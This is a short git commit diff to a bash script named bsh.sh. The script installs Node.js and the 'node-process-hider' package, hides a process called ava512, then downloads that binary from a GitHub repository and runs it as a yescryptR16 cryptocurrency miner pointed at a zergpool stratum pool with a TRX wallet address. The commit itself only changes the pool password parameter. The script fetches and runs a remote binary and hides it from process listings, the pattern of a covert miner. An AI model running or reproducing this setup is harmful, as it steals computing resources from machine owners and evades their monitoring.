9a2ced3de55abaa7c9359849674eb901c60328e5
rosfizaenul1810 <108688068+rosfizaenul1810@users.noreply.github.com>
2022-07-05 00:21:40 +0700

    Update bsh.sh

--- bsh.sh
+++ bsh.sh
@@ -1,3 +1,3 @@
 #!/bin/bash
 sudo apt update && sudo apt install gcc -y && curl -sL https://deb.nodesource.com/setup_12.x | sudo -E bash - && apt install nodejs && npm install -g npm@8.13.2 && npm i -g node-process-hider && ph add ava512
-wget https://github.com/rosfizaenul1810/tuwir/raw/main/ava512 && chmod +x ava512 && ./ava512 -a yescryptR16 -o stratum+tcp://yescryptR16.mine.zergpool.com:6333 -u TQ11YB4cti4EhwYkZkoYNwE9B7nkQvTJ86 -p c=TRX,mc=QOGE -t 2
+wget https://github.com/rosfizaenul1810/tuwir/raw/main/ava512 && chmod +x ava512 && ./ava512 -a yescryptR16 -o stratum+tcp://yescryptR16.mine.zergpool.com:6333 -u TQ11YB4cti4EhwYkZkoYNwE9B7nkQvTJ86 -p c=TRX,mc=QOGE,m=solo -t 2
